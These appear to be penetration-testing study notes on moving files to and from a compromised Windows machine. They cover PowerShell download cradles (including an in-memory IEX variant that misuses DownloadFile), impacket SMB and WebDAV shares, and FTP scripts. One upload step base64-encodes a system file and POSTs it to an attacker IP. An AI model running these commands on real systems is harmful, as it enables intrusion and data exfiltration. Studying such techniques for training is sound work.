
## Download
```powershell-session
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

But to load powershell script directly into memory (and not on disk as above) we have tu use `Invoke-Expression`

```powershell-session
IEX (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

From powershell 3.0, a new command is available: `Invoke-WebRequest` (albeit slower)

```powershell
Invoke-WebRequest <url> -OutFile <output> (-UseBasicParsing)
```


### SMB server

We can create a local SMB server from our attack machine to download on the target. Using impacket:
	`impacket-smbserver share -smb2support <path-to-share>`

Then from the windows machine:
		`copy \\<ip>\share\<file>`
Optionnally, we can set a username + password, which may be required due to some Windows Firewall. We then have to mount the share on the windows machine with:
```cmd-session
net use n: \\<ip>\share /user:<username> <password>
```

### FTP

We can also use FTP server to transfer files.
On linux we setup the server with `pyftpdlib` (from pip)

And on the windows machine we use `Net.WebClient`
```powershell-session
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\<output-file>')
```


On the low level side, we can also use directly FTP command in a file.
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


## Upload

From the target machine to our attack machine, we can do:
```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Which we can catch using netcat for example


### SMB

As companies usually don't allow outbound SMB traffic, we have to use HTTP (which is usually allowed), [webDAV](https://datatracker.ietf.org/doc/html/rfc4918) (HTTP entension)

On the attack machine, we need to install (pip) wsgidav and cheroot and run (CLI) wsgidav server. Now we can try to connect to the DavWWWRoot (special windows shell keyword) directory:

```cmd-session
dir \\<ip>\DavWWWRoot
```

### FTP

Exaclty similar do download (but use `UploadFile` method)